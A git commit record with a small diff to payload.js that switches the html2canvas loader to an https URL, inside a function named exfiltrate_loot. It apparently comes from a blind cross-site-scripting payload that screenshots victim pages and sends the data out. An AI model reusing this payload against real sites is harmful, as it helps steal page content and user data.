9413c3312f02fd3f3a417c5972e194c4aa21cea8
Rotem Reiss <reiss.r@gmail.com>
2020-11-04 10:41:54 +0200

    Change the html2canvas schema to always load from https

--- payload.js
+++ payload.js
@@ -65,6 +65,6 @@ function exfiltrate_loot() {
           exfiltrate_loot();
         });
     };
-    script.src = "//cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
+    script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
     d.getElementsByTagName('head')[0].appendChild(script);
 }(document));
